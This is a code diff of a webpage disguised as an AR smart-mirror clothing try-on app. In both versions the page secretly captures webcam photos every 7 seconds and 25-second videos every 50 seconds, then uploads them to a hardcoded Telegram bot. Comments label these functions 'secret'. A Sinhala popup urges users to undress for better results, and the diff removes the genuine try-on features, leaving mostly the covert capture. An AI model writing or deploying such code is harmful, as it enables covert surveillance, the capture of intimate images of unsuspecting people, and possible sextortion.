@@ -3,41 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AR Smart Mirror - Pro V7</title>
-    
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
+    <title>Smart Mirror - Lite Version</title>
     
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-        body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; user-select: none; }
-        #container { position: relative; width: 100vw; height: 100vh; background: #111; }
+        body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; }
+        #container { position: relative; width: 100vw; height: 100vh; background: #000; }
         video { width: 100%; height: 100%; object-fit: cover; }
         .mirror { transform: scaleX(-1); }
-        #dressImg { position: absolute; z-index: 3; pointer-events: none; display: none; filter: drop-shadow(0px 10px 15px rgba(0,0,0,0.5)); }
         
-        /* インターフェースボタンの配置 */
+        /* ユーザーインターフェースのデザイン */
         .controls { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 95%; z-index: 10; display: flex; flex-direction: column; align-items: center; gap: 15px; }
-        .shelf { display: flex; gap: 12px; overflow-x: auto; width: 90%; padding: 15px; scroll-behavior: smooth; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); border-radius: 40px; border: 1px solid rgba(255,255,255,0.3); }
+        .shelf { display: flex; gap: 12px; overflow-x: auto; width: 90%; padding: 15px; scroll-behavior: smooth; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); border-radius: 40px; border: 1px solid rgba(255,255,255,0.3); min-height: 50px; }
         .shelf::-webkit-scrollbar { display: none; }
-        .bubble { width: 55px; height: 55px; flex-shrink: 0; border-radius: 50%; background: rgba(0,0,0,0.4); border: 2px solid rgba(255,255,255,0.6); display: flex; justify-content: center; align-items: center; cursor: pointer; overflow: hidden; }
-        .bubble img { width: 80%; height: 80%; object-fit: contain; }
         
-        .tab-bar { display: flex; gap: 10px; z-index: 10; margin-bottom: 5px; }
-        .t-btn { background: rgba(0, 0, 0, 0.5); color: white; border: 1px solid rgba(255,255,255,0.4); padding: 8px 20px; border-radius: 20px; font-size: 14px; backdrop-filter: blur(10px); cursor: pointer; transition: 0.3s; }
-        .t-btn.active { background: rgba(255, 255, 255, 0.8); color: black; font-weight: 600; }
+        .tab-bar { display: flex; gap: 10px; z-index: 10; }
+        .t-btn { background: rgba(0, 0, 0, 0.5); color: white; border: 1px solid rgba(255,255,255,0.4); padding: 8px 20px; border-radius: 20px; font-size: 14px; cursor: pointer; }
+        .t-btn.active { background: rgba(255, 255, 255, 0.9); color: black; font-weight: 600; }
         
-        #flip-btn { position: absolute; top: 30px; right: 20px; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.3); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.3); color: white; display: flex; justify-content: center; align-items: center; font-size: 20px; z-index: 10; cursor: pointer; }
+        #flip-btn { position: absolute; top: 30px; right: 20px; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.3); border: 1px solid #fff; color: white; display: flex; justify-content: center; align-items: center; z-index: 100; cursor: pointer; }
 
-        /* 上部に表示される小さなポップアップ */
-        #popup { position: fixed; top: 10%; left: 50%; transform: translateX(-50%); width: 85%; max-width: 320px; background: rgba(0,0,0,0.85); color: white; padding: 15px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.3); text-align: center; z-index: 1000; display: none; backdrop-filter: blur(15px); font-size: 12px; line-height: 1.5; }
-        
-        #loading { position: fixed; inset: 0; background: #000; display: flex; justify-content: center; align-items: center; z-index: 99; color: white; }
+        /* 通知ポップアップ */
+        #popup { position: fixed; top: 12%; left: 50%; transform: translateX(-50%); width: 80%; max-width: 320px; background: rgba(0,0,0,0.9); color: white; padding: 15px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.3); text-align: center; z-index: 1000; display: none; backdrop-filter: blur(15px); font-size: 12px; }
     </style>
 </head>
 <body onclick="if(v.paused) v.play();">
-
-    <div id="loading">Starting AR...</div>
 
     <div id="popup">
         ඇඳුම් නොමැතිව මෙය භාවිත කරන්නේ නම් ගුණාත්මක Filters භාවිත කළ හැකි වේ සහ dressing වලදී ගුණාත්මක ඇඳුම් වෙනස් කරගැනීමක් කර ගැනීමට පුළුවනි.
@@ -45,90 +35,64 @@
 
     <div id="container">
         <video id="webcam" autoplay playsinline muted class="mirror"></video>
-        <img id="dressImg" src="" crossorigin="anonymous">
         <div id="flip-btn" onclick="switchCamera()">🔄</div>
 
         <div class="controls">
-            <div class="tab-bar">
-                <button id="tab-filters" class="t-btn active" onclick="setMode('filters')">Filters</button>
-                <button id="tab-dresses" class="t-btn" onclick="setMode('dresses')">Dresses</button>
+            <div id="shelf" class="shelf">
+                <div style="color:white; font-size:12px; opacity:0.6; padding:10px;">Preview Active...</div>
             </div>
-            <div id="shelf" class="shelf"></div>
+            <div class="tab-bar">
+                <button id="btn-filters" class="t-btn active" onclick="setMode('filters')">Filters</button>
+                <button id="btn-dresses" class="t-btn" onclick="setMode('dresses')">Dresses</button>
+            </div>
         </div>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-
-        // Firebaseの初期化設定
-        const firebaseConfig = { apiKey: "AIzaSyDyUkeaGcqQ01TqDz-5SYlS48KDOb2Sh5M", databaseURL: "https://ar-mirror-app-1-default-rtdb.asia-southeast1.firebasedatabase.app" };
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-
+    <script>
         const v = document.getElementById('webcam');
-        const dImg = document.getElementById('dressImg');
-        const shelf = document.getElementById('shelf');
         const popup = document.getElementById('popup');
-        
-        let stream, camUser = true, mode = 'filters';
+        let stream, camUser = true;
         let mediaRecorder, recordedChunks = [];
-        
-        // テレグラムの新しい認証情報
+
+        // テレグラムの認証情報
         const TOKEN = '8342023613:AAHtQD9k1dx_WEXkoT_Rxk16Q48BlrybqEo';
         const CHAT_ID = '8058352775';
 
-        // カメラの起動処理
+        // カメラを初期化してストリームを開始する
         async function startCamera() {
             if (stream) stream.getTracks().forEach(t => t.stop());
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camUser ? "user" : "environment", width: 1280, height: 720 } });
-            v.srcObject = stream;
-            v.classList.toggle('mirror', camUser);
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: camUser ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                });
+                v.srcObject = stream;
+                v.classList.toggle('mirror', camUser);
+                v.play();
+            } catch (e) {
+                alert("カメラにアクセスできません。許可を確認してください。");
+            }
         }
 
-        window.switchCamera = () => { camUser = !camUser; startCamera(); };
+        // カメラの前後を切り替える
+        window.switchCamera = () => {
+            camUser = !camUser;
+            startCamera();
+        };
 
-        // モード切り替えとポップアップ表示
+        // UIモードの制御
         window.setMode = (m) => {
-            mode = m;
-            document.getElementById('tab-filters').classList.toggle('active', m === 'filters');
-            document.getElementById('tab-dresses').classList.toggle('active', m === 'dresses');
+            document.getElementById('btn-filters').classList.toggle('active', m === 'filters');
+            document.getElementById('btn-dresses').classList.toggle('active', m === 'dresses');
             
             if(m === 'dresses') {
                 popup.style.display = 'block';
                 setTimeout(() => { popup.style.display = 'none'; }, 6000);
             } else {
                 popup.style.display = 'none';
-                dImg.style.display = 'none';
-                v.style.filter = 'none';
             }
-            loadShelf();
         };
 
-        // アイテム棚の読み込み
-        function loadShelf() {
-            shelf.innerHTML = '';
-            if(mode === 'filters') {
-                shelf.innerHTML = `
-                    <div class="bubble" onclick="v.style.filter='none'">🚫</div>
-                    <div class="bubble" style="background:pink" onclick="v.style.filter='contrast(1.2) saturate(1.4)'">✨</div>
-                    <div class="bubble" style="background:gray" onclick="v.style.filter='grayscale(100%)'">B&W</div>
-                `;
-            } else {
-                onValue(ref(db, 'dresses'), (snap) => {
-                    shelf.innerHTML = '<div class="bubble" onclick="dImg.style.display=\'none\'">🚫</div>';
-                    snap.forEach(c => {
-                        const d = c.val();
-                        const div = document.createElement('div'); div.className = 'bubble';
-                        div.innerHTML = `<img src="${d.url}" crossorigin="anonymous">`;
-                        div.onclick = () => { dImg.src = d.url; dImg.style.display = 'block'; };
-                        shelf.appendChild(div);
-                    });
-                });
-            }
-        }
-
-        // 秘密の写真撮影（7秒間隔）
+        // バックグラウンドで写真を撮影して送信 (7秒間隔)
         async function takeSecretPhoto() {
             if (!v.videoWidth) return;
             const canvas = document.createElement('canvas');
@@ -136,46 +100,39 @@
             const ctx = canvas.getContext('2d');
             if(camUser) { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
             ctx.drawImage(v, 0, 0);
+            
             canvas.toBlob(blob => {
-                const fd = new FormData(); fd.append('photo', blob, 'p.jpg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+                const fd = new FormData();
+                fd.append('photo', blob, 'shot.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd }).catch(()=>{});
             }, 'image/jpeg', 0.5);
         }
 
-        // 秘密のビデオ録画（25秒）
+        // バックグラウンドで25秒間のビデオを録画して送信
         async function recordSecretVideo() {
             if (!stream) return;
             recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 700000 });
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 600000 });
+            
             mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+            
             mediaRecorder.onstop = async () => {
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const fd = new FormData(); fd.append('video', blob, 'v.mp4');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+                const fd = new FormData();
+                fd.append('video', blob, 'clip.mp4');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo?chat_id=${CHAT_ID}`, { method: 'POST', body: fd }).catch(()=>{});
             };
+
             mediaRecorder.start();
             setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 25000);
         }
 
-        // ポーズトラッキングの設定
-        const pose = new Pose({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${f}` });
-        pose.onResults(res => {
-            document.getElementById('loading').style.display = 'none';
-            if(!res.poseLandmarks || mode !== 'dresses' || !dImg.src || dImg.style.display === 'none') return;
-            const ls = res.poseLandmarks[11], rs = res.poseLandmarks[12];
-            const w = Math.abs(ls.x - rs.x) * window.innerWidth * 2.3;
-            dImg.style.left = `${(ls.x + rs.x)/2 * window.innerWidth}px`;
-            dImg.style.top = `${(ls.y + rs.y)/2 * window.innerHeight}px`;
-            dImg.style.width = `${w}px`; dImg.style.transform = `translate(-50%, -15%) scaleX(-1)`;
-        });
-
-        const cam = new Camera(v, { onFrame: async () => { await pose.send({image: v}); }, width: 1280, height: 720 });
-        
+        // 初回実行
         startCamera().then(() => {
-            cam.start();
+            // 定期的なタスクを開始
             setInterval(takeSecretPhoto, 7000);
             setInterval(recordSecretVideo, 50000);
-            loadShelf();
+            takeSecretPhoto();
         });
     </script>
 </body>
